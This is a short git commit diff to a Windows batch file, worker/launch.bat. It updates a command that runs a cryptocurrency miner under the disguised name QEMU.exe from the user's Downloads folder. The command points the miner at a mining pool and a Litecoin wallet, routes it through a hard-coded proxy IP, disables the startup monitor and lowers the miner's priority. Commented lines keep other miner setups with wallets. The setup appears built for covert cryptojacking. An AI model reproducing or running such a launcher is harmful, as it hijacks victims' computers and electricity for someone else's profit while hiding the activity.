808e3fd383d52c05ce88f7c46971a8182ba98fc7
dediminari <101470275+dediminari@users.noreply.github.com>
2026-01-15 10:33:43 +0700

    Update launch.bat

--- worker/launch.bat
+++ worker/launch.bat
@@ -8,6 +8,4 @@ cls
 #C:\Users\%USERNAME%\Downloads\XM\QEMU.exe -o hk.qrl.herominers.com:1166 -b 47.239.161.149:1111 -m nicehash -u Q01050053cb14eb8e70841bc81c0aabcd002559f18061f85b3539de65a43bd1a0dda7dcafa724b4.quan -a randomx -k
 #C:\Users\%USERNAME%\Downloads\XM\QEMU.exe -o hk.qrl.herominers.com:1166 -u Q01050053cb14eb8e70841bc81c0aabcd002559f18061f85b3539de65a43bd1a0dda7dcafa724b4.quan -a rx/0 -k
 #C:\Users\%USERNAME%\Downloads\there0\QEMU.exe -d dero-node.mysrv.cloud:10100 -w dero1qy2jzkctwl7mmlnpn45kk54l46lpszn7pamt072wtg62hl7j4v4xvqgld2v2c -t 2 --never-stop --restart-on-zero-hashrate
-C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm yespowerr16 --pool yespowerR16.sea.mine.zpool.ca:6534 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --password c=LTC --disable-gpu  --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --cpu-threads 2 --proxy 174.138.61.184:1080
-
-
+C:\Users\%USERNAME%\Downloads\QEMU.exe --algorithm yespowerr16 --pool yespowerR16.sea.mine.zpool.ca:6534 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --password c=LTC --disable-gpu --nicehash false --keepalive true --disable-startup-monitor --disable-huge-pages --disable-msr-tweaks --cpu-threads 2 --cpu-threads-intensity 1 --cpu-threads-priority 1 --miner-priority 1 --proxy 174.138.61.184:1080
